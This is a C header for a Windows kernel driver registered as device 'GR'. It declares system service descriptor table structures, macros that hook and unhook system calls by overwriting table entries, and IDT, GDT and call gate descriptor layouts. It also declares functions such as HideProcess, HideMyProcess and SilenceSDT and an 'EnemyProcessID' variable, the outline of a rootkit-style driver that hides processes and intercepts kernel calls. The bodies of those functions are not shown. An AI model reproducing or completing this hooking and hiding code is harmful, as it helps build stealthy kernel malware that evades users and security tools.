#pragma once

#include <NTDDK.H>
#include <STDARG.H>
#include <STDIO.H>
#include "Process.h"
#include "Hook.h"

#define DWORD unsigned long
#define WORD unsigned short
#define BOOL unsigned long
#define BYTE unsigned char
#define PROCNAMELEN     30
#define NT_PROCNAMELEN  15

ULONG gProcessNameOffset;
extern ULONG EnemyProcessID;
static ULONG	G_nLockUseCounter;
extern ULONG	SERVICEID_WM;
extern ULONG	SERVICEID_RM;
extern ULONG	SERVICEID_GC;
extern ULONG	SERVICEID_SC;

#define WIN_DEVICE_NAME	L"\\Device\\GR"
#define DOS_DEVICE_NAME L"\\DosDevices\\GR"

#pragma pack(1)
typedef struct ServiceDescriptorEntry {
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase; 
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

typedef struct _SRVTABLE {
	PVOID           *ServiceTable;
	ULONG           LowCall;        
	ULONG           HiCall;
	PVOID			*ArgTable;
} SRVTABLE, *PSRVTABLE;


struct _SYSTEM_THREADS
{
	LARGE_INTEGER		KernelTime;
	LARGE_INTEGER		UserTime;
	LARGE_INTEGER		CreateTime;
	ULONG				WaitTime;
	PVOID				StartAddress;
	CLIENT_ID			ClientIs;
	KPRIORITY			Priority;
	KPRIORITY			BasePriority;
	ULONG				ContextSwitchCount;
	ULONG				ThreadState;
	KWAIT_REASON		WaitReason;
};

struct _SYSTEM_PROCESSES
{
	ULONG				NextEntryDelta;
	ULONG				ThreadCount;
	ULONG				Reserved[6];
	LARGE_INTEGER		CreateTime;
	LARGE_INTEGER		UserTime;
	LARGE_INTEGER		KernelTime;
	UNICODE_STRING		ProcessName;
	KPRIORITY			BasePriority;
	ULONG				ProcessId;
	ULONG				InheritedFromProcessId;
	ULONG				HandleCount;
	ULONG				Reserved2[2];
	VM_COUNTERS			VmCounters;
	IO_COUNTERS			IoCounters; //windows 2000 only
	struct _SYSTEM_THREADS		Threads[1];
};


typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation,              // 0
    SystemProcessorInformation,          // 1
    SystemPerformanceInformation,        // 2
    SystemTimeOfDayInformation,          // 3
    SystemNotImplemented1,               // 4
    SystemProcessesAndThreadsInformation, // 5
    SystemCallCounts,                    // 6
    SystemConfigurationInformation,      // 7
    SystemProcessorTimes,                // 8
    SystemGlobalFlag,                    // 9
    SystemNotImplemented2,               // 10
    SystemModuleInformation,             // 11
    SystemLockInformation,               // 12
    SystemNotImplemented3,               // 13
    SystemNotImplemented4,               // 14
    SystemNotImplemented5,               // 15
    SystemHandleInformation,             // 16
    SystemObjectInformation,             // 17
    SystemPagefileInformation,           // 18
    SystemInstructionEmulationCounts,    // 19
    SystemInvalidInfoClass1,             // 20
    SystemCacheInformation,              // 21
    SystemPoolTagInformation,            // 22
    SystemProcessorStatistics,           // 23
    SystemDpcInformation,                // 24
    SystemNotImplemented6,               // 25
    SystemLoadImage,                     // 26
    SystemUnloadImage,                   // 27
    SystemTimeAdjustment,                // 28
    SystemNotImplemented7,               // 29
    SystemNotImplemented8,               // 30
    SystemNotImplemented9,               // 31
    SystemCrashDumpInformation,          // 32
    SystemExceptionInformation,          // 33
    SystemCrashDumpStateInformation,     // 34
    SystemKernelDebuggerInformation,     // 35
    SystemContextSwitchInformation,      // 36
    SystemRegistryQuotaInformation,      // 37
    SystemLoadAndCallImage,              // 38
    SystemPrioritySeparation,            // 39
    SystemNotImplemented10,              // 40
    SystemNotImplemented11,              // 41
    SystemInvalidInfoClass2,             // 42
    SystemInvalidInfoClass3,             // 43
    SystemTimeZoneInformation,           // 44
    SystemLookasideInformation,          // 45
    SystemSetTimeSlipEvent,              // 46
    SystemCreateSession,                 // 47
    SystemDeleteSession,                 // 48
    SystemInvalidInfoClass4,             // 49
    SystemRangeStartInformation,         // 50
    SystemVerifierInformation,           // 51
    SystemAddVerifier,                   // 52
    SystemSessionProcessesInformation    // 53
} SYSTEM_INFORMATION_CLASS;

__declspec(dllimport) void *PsInitialSystemProcess;
__declspec(dllimport) ULONG NtBuildNumber;
__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;

#define SYSTEMSERVICE(_function)  KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]
#define SYSTEMSERVICEIDX(_index) KeServiceDescriptorTable.ServiceTableBase[_index]

#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)
#define HOOK_SYSCALL(_Function, _Hook, _Orig )  \
       _Orig = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)

#define UNHOOK_SYSCALL(_Function, _Hook, _Orig )  \
       InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)

#define	WIN_VER_40	0x01	//001
#define	WIN_VER_2K	0x02	//010
#define	WIN_VER_XP	0x04	//100

extern ULONG	G_nWinMajorVersion; //initiaize -1
extern ULONG	G_nWinMinorVersion; //initiaize -1

#define	BEGINE_WIN_VER(x) \
	{	\
		if(G_nWinMajorVersion == -1) \
		{	\
			PsGetVersion(&G_nWinMajorVersion, &G_nWinMinorVersion, NULL, NULL);	\
			KdPrint(("OS Version %d(%d)\n", G_nWinMajorVersion, G_nWinMinorVersion));	\
			if(G_nWinMajorVersion == 4)	\
			{	G_nWinMajorVersion = WIN_VER_40; }	\
			else if(G_nWinMajorVersion == 5 && G_nWinMinorVersion == 0)	\
			{	G_nWinMajorVersion = WIN_VER_2K; }	\
			else if(G_nWinMajorVersion == 5 && G_nWinMinorVersion == 1)	\
			{	G_nWinMajorVersion = WIN_VER_XP; }	\
		} \
		if(G_nWinMajorVersion & ( x ))	\
		{
		
#define ELSE_WIN_VER()	 }else {
	
#define ELSE_IF_WIN_VER(x)	 }else if(G_nWinMajorVersion & ( x )) {

#define END_WIN_VER()	 } }


VOID SetupSTBHook( void );
NTSTATUS DispatchPassThru( IN PDEVICE_OBJECT DeviceObject,
						 IN PIRP Irp );

NTSTATUS My_IoControl(PFILE_OBJECT pFileObject,
					  ULONG nIoCode, 
					  PCHAR pSystemBuffer,
					  ULONG nInput,
					  ULONG nOutput,
					  ULONG *nReturnOut);

static VOID DriverUnload (
		IN PDRIVER_OBJECT	pDriverObject	);

NTSTATUS DriverControl ( IN PDEVICE_OBJECT DeviceObject,
						IN PIRP Irp );

VOID PrintStartInfo( void );
void SilenceSDT();
void HideProcess();
VOID GetProcessNameOffset( void );
VOID GetServiceTableOffset(ULONG *eThread );
BOOL GetProcessName(PCHAR theName);
void HideMyProcess();
VOID PsNoify(HANDLE ParentID, HANDLE ProcessID, BOOLEAN bCreate);
VOID ThreadNoify(HANDLE ProcessID, HANDLE ThreadID, BOOLEAN Create);

NTKERNELAPI
NTSTATUS
ObOpenObjectByPointer (
    IN PVOID            Object,
    IN ULONG            HandleAttributes,
    IN PACCESS_STATE    PassedAccessState OPTIONAL,
    IN ACCESS_MASK      DesiredAccess OPTIONAL,
    IN POBJECT_TYPE     ObjectType OPTIONAL,
    IN KPROCESSOR_MODE  AccessMode,
    OUT PHANDLE         Handle
);

NTKERNELAPI
NTSTATUS
PsLookupProcessByProcessId (
    IN HANDLE ProcessId,
    OUT PEPROCESS *Process
    );

NTKERNELAPI
NTSTATUS
PsLookupThreadByThreadId (
    IN HANDLE ThreadId,
    OUT PETHREAD *Thread
    );

NTSYSAPI 
NTSTATUS
NTAPI
NtDeviceIoControlFile(

  IN HANDLE               FileHandle,
  IN HANDLE               Event OPTIONAL,
  IN PIO_APC_ROUTINE      ApcRoutine OPTIONAL,
  IN PVOID                ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK    IoStatusBlock,
  IN ULONG                IoControlCode,
  IN PVOID                InputBuffer OPTIONAL,
  IN ULONG                InputBufferLength,
  OUT PVOID               OutputBuffer OPTIONAL,
  IN ULONG                OutputBufferLength );


#define MAKELONG(a, b) ((LONG) (((WORD) (a)) | ((DWORD) ((WORD) (b))) << 16)) 

#pragma pack(1)
typedef struct
{
	WORD LowOffset;
	WORD selector;
	BYTE unused_lo;
	unsigned char unused_hi:5; /* stored TYPE ? */
	unsigned char DPL:2; 
	unsigned char P:1; /* present */
	WORD HiOffset;
} IDTENTRY;

/* sidt returns idt in this format */
typedef struct
{
	WORD IDTLimit;
	WORD LowIDTbase;
	WORD HiIDTbase;
} IDTINFO;

/* from undoc nt */
typedef struct
{
    unsigned short  limit_0_15;
    unsigned short  base_0_15;
    unsigned char   base_16_23;

    unsigned char    accessed    : 1;
    unsigned char    readable    : 1;
    unsigned char    conforming  : 1;
    unsigned char    code_data   : 1;
    unsigned char    app_system  : 1;
    unsigned char    dpl         : 2;
    unsigned char    present     : 1;

    unsigned char    limit_16_19 : 4;
    unsigned char    unused      : 1;
    unsigned char    always_0    : 1;
    unsigned char    seg_16_32   : 1;
    unsigned char    granularity : 1;

    unsigned char   base_24_31;
} CODE_SEG_DESCRIPTOR;

/* from undoc nt */
typedef struct
{
    unsigned short  offset_0_15;
    unsigned short  selector;

    unsigned char    param_count : 4;
    unsigned char    some_bits   : 4;

    unsigned char    type        : 4;
    unsigned char    app_system  : 1;
    unsigned char    dpl         : 2;
    unsigned char    present     : 1;

    unsigned short  offset_16_31;
} CALLGATE_DESCRIPTOR;

#pragma pack()

#define MAX_IDT_ENTRIES 0xFF
#define NT_SYSTEM_SERVICE_INT 0x1


